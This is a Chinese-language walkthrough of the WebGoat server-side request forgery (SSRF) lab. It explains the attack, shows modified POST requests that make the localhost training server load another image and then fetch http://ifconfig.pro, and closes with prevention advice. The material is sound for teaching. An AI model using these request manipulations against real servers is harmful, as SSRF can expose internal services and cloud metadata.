---
id: 
title: Server-Side Request Forgery
---
<!-- muse start -->
Web Goat 的简略服务器端请求伪造。
<!-- muse end -->

## 1. 概念

在服务器端请求伪造（SSRF）攻击中，攻击者可滥用服务器功能读取或更新内部资源。攻击者能够提供或修改一个URL，运行在服务器上的代码将读取该URL或向其提交数据。此外，通过精心选择URL，攻击者可能读取服务器配置（如AWS元数据）、连接到内部服务（如启用HTTP的数据库），或向本不应暴露的内部服务发送POST请求。

### 目标

在后续页面的练习中，你需要检查浏览器发送给服务器的内容，并调整请求以从服务器获取其他信息。

### SSRF 操作指南

- https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF

## 2. 查找并修改请求以显示 Jerry

点击按钮并分析发生的情况。

基准请求为
```
POST /WebGoat/SSRF/task1 HTTP/1.1
Host: localhost:3000

url=images%2Ftom.png
```
响应截取为
`"output" : "<img class=\\\"image\\\" alt=\\\"Tom\\\" src=\\\"images\\/tom.png\\\" width=\\\"25%\\\" height=\\\"25%\\\">"`
即
```html
<img class="image" alt="Tom" src="images/tom.png" width="25%" height="25%">
```

请求体中的参数值对应相应中的图片`src`属性值。

修改请求体 `url=images%2Fjerry.png` 返回 `jerry` 的 `src` 后通过挑战

## 3. 修改请求，使服务器从 http://ifconfig.pro 获取信息

点击按钮并分析发生的情况。

基准请求为
```http
POST /WebGoat/SSRF/task2 HTTP/1.1
Host: localhost:3000

url=images%2Fcat.png
```
响应截取为
`"output" : "<img class=\\\"image\\\" alt=\\\"image post\\\" src=\\\"images\\/cat.jpg\\\">"`
即
```html
<img class="image" alt="image post" src="images/cat.jpg">
```
从上个挑战的相对目录修改为绝对 URL 路径
`url=http://ifconfig.pro`

## 4. 防护措施

为预防Web应用中的SSRF漏洞，建议遵循以下准则：

- 使用白名单机制限制Web服务器可获取资源的允许域名、资源和协议
- 对用户输入进行验证，若不符合预期的正面规范则拒绝接受
- 尽可能避免在控制Web服务器资源获取位置的函数中接受用户输入

### 参考资料

- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
